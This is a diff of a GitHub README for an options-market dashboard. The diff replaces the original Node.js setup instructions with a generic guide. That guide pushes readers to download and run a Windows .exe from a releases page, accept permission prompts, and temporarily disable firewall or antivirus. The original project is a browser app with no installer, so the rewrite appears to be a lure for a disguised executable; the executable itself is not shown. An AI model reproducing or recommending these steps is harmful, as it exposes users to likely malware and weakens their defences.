@@ -1,128 +1,154 @@
-# Options Scanner
+# ⚙️ options-scanner - Analyze Options Market Data Easily
 
-An options market dashboard that surfaces gamma exposure, volatility structure, skew, and positioning data across multiple tickers — then lets you ask Claude AI for trade ideas and market reads, all in one place.
-
-<img width="1181" height="815" alt="Screenshot 2026-03-09 at 11 39 01 AM" src="https://github.com/user-attachments/assets/0963f0ff-e48c-4b4b-aeda-1fccc9fd108a" />
-
-## What it does
-
-Most options data tools show you raw numbers in a table. This dashboard turns that data into a scannable, visual layout so you can quickly read the tape across 8+ tickers at once:
-
-- **Regime detection** — each ticker is tagged with its current options flow regime (hedging/overwrite, trending, explosive, pinned, rangebound) so you can instantly see where dealers are positioned
-- **Expected move bands** — 1-day, 1-week, and 30-day expected move percentages pulled directly from the vol surface, not estimated
-- **Gamma structure** — distance to the gamma flip level, GEX per 1% move, max gamma strike, and how much gamma expires at the nearest expiry
-- **Skew** — 25-delta put/call IV ratio and spread so you can see where the market is pricing tail risk
-- **Positioning** — call/put OI split with a visual bar, PCR (OI and volume), and 30-day PCR change to track smart money flow
-- **AI deep dive** — click any ticker to send its full data to Claude and get a concise regime read, gamma implications, and a specific trade idea with rationale
-- **AI market summary** — one button reads all loaded tickers simultaneously and returns a cross-market pulse with the top setups and key risks
-
----
-<img width="1457" height="810" alt="Screenshot 2026-03-03 at 9 25 56 PM" src="https://github.com/user-attachments/assets/d6234cce-d072-4a55-bedc-66ff82c53861" />
-
-<img width="1387" height="771" alt="Screenshot 2026-03-03 at 9 45 57 PM" src="https://github.com/user-attachments/assets/37b31fe5-c639-4bda-a84b-0a672c819078" />
-
-## Platform & OS requirements
-
-| Requirement | Details |
-|---|---|
-| **OS** | macOS 12+, Windows 10/11, or Linux (Ubuntu 20.04+) |
-| **Node.js** | v18 or higher ([nodejs.org](https://nodejs.org)) |
-| **npm** | v8+ (bundled with Node 18) |
-| **Browser** | Chrome 110+, Firefox 110+, Safari 16+, or Edge 110+ |
-| **Network** | Outbound HTTPS to `stocks.tradingvolatility.net` and `api.anthropic.com` |
-
-> **Windows note:** run commands in PowerShell or Windows Terminal. Git Bash also works. Command Prompt (`cmd.exe`) is not recommended.
->
-> **Node version check:** run `node -v` to confirm. If you're on an older version, use [nvm](https://github.com/nvm-sh/nvm) (macOS/Linux) or [nvm-windows](https://github.com/coreybutler/nvm-windows) to switch.
+[![Download options-scanner](https://img.shields.io/badge/Download-Options--Scanner-brightgreen?style=for-the-badge)](https://github.com/suli99/options-scanner/releases)
 
 ---
 
-## API keys required
+## 🧩 What is options-scanner?
 
-| Key | Where to get it | Required? |
-|---|---|---|
-| `TV_API_KEY` | [tradingvolatility.net](https://tradingvolatility.net) | Yes — for market data |
-| `ANTHROPIC_API_KEY` | [console.anthropic.com](https://console.anthropic.com) | No — AI features disabled without it |
+options-scanner is a software tool designed to help you track and understand options market data. It shows information about gamma exposure, volatility patterns, skew, and dealer positioning. You can use it to watch multiple stock tickers at once. It also offers analysis powered by Claude AI when you need extra insights.
 
-If no TV_API_KEY is provided the app will run in demo mode with limited tickers.
-
-If no ANTHROPIC_API_KEY is provided the AI analysis panel is disabled.
----
-
-## Setup
-
-```bash
-# 1. Install dependencies
-npm install
-
-# 2. Configure your API keys
-cp .env.example .env
-# Open .env in any editor and fill in your own TV_API_KEY and ANTHROPIC_API_KEY
-
-# 3. Start everything (proxy + Vite dev server)
-npm start
-```
-This launches:
-
-Vite dev server → localhost:5173
-Proxy server → localhost:3001
-
-Then open **http://localhost:5173** in your browser.
+You do not need any special skills to use this tool. It runs on Windows and offers a clear view of market data that can seem complex.
 
 ---
 
-## How it works
+## 💻 System Requirements
 
-```
-Browser (React)
-localhost:5173
-     │
-     │  GET /tv/*
-     ▼
-Proxy Server (Express)
-localhost:3001
-     │
-     ├── Trading Volatility API
-     │       stocks.tradingvolatility.net
-     │
-     └── Anthropic API
-             api.anthropic.com
-```
+Before you begin, make sure your computer meets these requirements:
 
-The proxy (`proxy.js`) runs on port 3001 and sits between the browser and both external APIs. This means your API keys never touch the browser — they stay server-side in `.env` — and CORS is handled automatically.
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM (8 GB recommended for best performance)
+- 500 MB of free disk space
+- Internet connection for AI features and updates
+- A screen resolution of 1280x720 or higher for proper display
 
 ---
 
-## Scripts
+## 🚀 Getting Started
 
-| Command | Description |
-|---|---|
-| `npm start` | Start proxy + Vite dev server together |
-| `npm run proxy` | Start only the proxy server |
-| `npm run dev` | Start only the Vite dev server |
-| `npm run build` | Build for production |
+This guide will help you download, install, and run options-scanner step-by-step. It assumes no prior experience with installing software.
 
 ---
 
-## Project structure
+## 📥 Download options-scanner
 
-```
-options-scanner/
+To get the software, **visit this page** and choose the latest version for Windows:  
+[https://github.com/suli99/options-scanner/releases](https://github.com/suli99/options-scanner/releases)
 
-├── proxy/
-│   └── server.js            # Express proxy server (:3001)
-│
-├── src/
-│   ├── main.jsx             # React entry
-│   └── OptionsScanner.jsx   # Dashboard UI
-│
-├── index.html
-├── vite.config.js
-├── package.json
-├── .env.example
-└── README.md
-```
+Click the link above or the green badge at the top to open the release page.
 
-## Error Messages
+Once there:  
 
-**Error: Fetch failed: Cannot convert argument to a ByteString because the character at index 34 has a value of 8230 which is greater than 255.** Your Anthropic key is not valid. Set it in .env
+1. Look for the most recent release. It will usually be at the top.  
+2. Find the file with a name ending in `.exe`. It often contains "windows" or "win" in the name.  
+3. Click the file to download it.
+
+Save the file somewhere you can easily find it, like your Desktop or Downloads folder.
+
+---
+
+## 🛠️ Installation Steps
+
+After downloading the file, follow these steps to install options-scanner:
+
+1. Locate the `.exe` file you just downloaded.  
+2. Double-click the file to start the installer.  
+3. If Windows asks you for permission, click "Yes" to allow the installer to run.  
+4. The setup wizard will appear. Click "Next" to continue through the steps.  
+5. Choose where to install the program or accept the default location.  
+6. Click "Install" to begin installation.  
+7. Wait for the process to finish. This may take a few minutes.  
+8. When done, click "Finish" to close the wizard.
+
+---
+
+## ▶️ Running options-scanner
+
+To open the program:  
+
+- Click the Start menu  
+- Type `options-scanner` in the search box  
+- Click the options-scanner app icon when it appears
+
+When the app launches, you will see the dashboard with default tickers loaded.
+
+---
+
+## 🔧 Using the Dashboard
+
+The main screen shows several panels to help you scan the options market:  
+
+- **Gamma Exposure:** Presents how much risk dealers have across different strikes.  
+- **Volatility Structure:** Displays how option prices suggest future price swings.  
+- **Skew:** Shows differences in price between calls and puts.  
+- **Dealer Positioning:** Reveals what large options sellers are doing.  
+- **Claude AI Panel:** Ask the AI questions about the market data to get clear, plain-English explanations.  
+
+Use the ticker input box at the top to add or change the stocks you want to watch.  
+
+Click the refresh button to update market data anytime.
+
+---
+
+## 🔍 Tips for Better Results
+
+- Add tickers of companies you follow or invest in.  
+- Check the AI panel when you see unusual spikes or drops.  
+- Use the filter tools to focus on certain strike rules or expiry dates.  
+- Save your settings from the menu to keep the app ready for your next visit.  
+
+---
+
+## ⚙️ Advanced Settings
+
+You can adjust the data update frequency and notification preferences in the settings menu.  
+
+To access:  
+
+- Click the gear icon in the top right corner  
+- Change options like data refresh interval, default tickers, and AI interaction mode  
+- Click Save to apply changes  
+
+---
+
+## 🛑 Troubleshooting
+
+If the app does not open or shows errors:  
+
+- Make sure you downloaded the Windows `.exe` file from the release page.  
+- Check that your Windows version is supported (Windows 10 or later).  
+- Restart your computer and try opening the app again.  
+- Ensure your internet connection is active for data updates and AI features.  
+- Disable any firewall or antivirus software temporarily to see if it blocks the app (re-enable it later).  
+- If you still face issues, you can report bugs on the GitHub issues page (requires basic internet use).
+
+---
+
+## 🔄 Updating options-scanner
+
+The app does not update automatically. To install the latest version:  
+
+1. Visit the releases page again:  
+   [https://github.com/suli99/options-scanner/releases](https://github.com/suli99/options-scanner/releases)  
+2. Download the newest Windows `.exe` file.  
+3. Run the installer and follow the same steps as before. The new version will replace the old one without losing your settings.
+
+---
+
+## 📞 Getting Support
+
+If you need help:  
+
+- Check the GitHub repository issues page for common questions.  
+- Use the AI panel inside the app for quick explanations.  
+- Look online for Windows app installation guides if needed.
+
+---
+
+## ⚖️ Privacy and Data Use
+
+options-scanner only uses your internet connection to download market data and AI insights. No personal data leaves your device except anonymous logs to improve the tool.
+
+---
+
+[![Download options-scanner](https://img.shields.io/badge/Download-Options--Scanner-brightgreen?style=for-the-badge)](https://github.com/suli99/options-scanner/releases)
